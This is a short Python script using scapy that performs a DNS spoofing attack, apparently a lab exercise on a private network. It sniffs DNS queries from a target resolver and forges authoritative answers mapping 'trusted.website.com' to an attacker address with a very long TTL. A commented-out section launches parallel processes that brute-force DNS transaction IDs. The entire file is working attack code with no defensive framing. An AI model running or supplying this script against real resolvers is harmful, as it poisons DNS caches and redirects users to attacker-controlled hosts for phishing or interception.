from scapy.all import *
import multiprocessing as mp

src_ip="192.168.0.100"
dst_ip="192.168.0.200"
mal_ip="192.168.0.151"

src_port=53
dst_port=6666

website='trusted.website.com'
ttl=500000

#precompute standard object
response=(IP(dst=dst_ip, src=src_ip)/UDP(dport=dst_port,sport=src_port)/DNS(id=1, qr=1, aa=1, qd=DNSQR(qname=website), an=DNSRR(rrname=website, ttl=ttl, rdata=mal_ip)))
dns_layer = response[DNS]

s = conf.L3socket()

def attack(start, end):
	start_time = time.time()
	for i in range (start,end,1):
		#update the qid and add to the list
		dns_layer.id = i
		s.send(response)

	end_time = time.time()
	print(end_time - start_time)


if __name__ == "__main__":
	mp.set_start_method('spawn')
	print("[*] Program is sniffing packets from " + dst_ip + " to " + src_ip)
	while 1:
		sniffed_packet=sniff(iface="eth0", filter="src host " + dst_ip + " and dst host " + src_ip + " and dst port 53", count=1)
		if sniffed_packet[0].haslayer(DNS):
			print("[*] DNS Packet has been sniffed. Malicious packet will be forged and sent")
			dns=sniffed_packet[0].getlayer(DNS)
			dns_layer.id = dns.id
			s.send(response)
		
			#for i in range(0,20,1):
			#	mp.Process(target=attack, args=((i*500), (i+1)*500)).start()
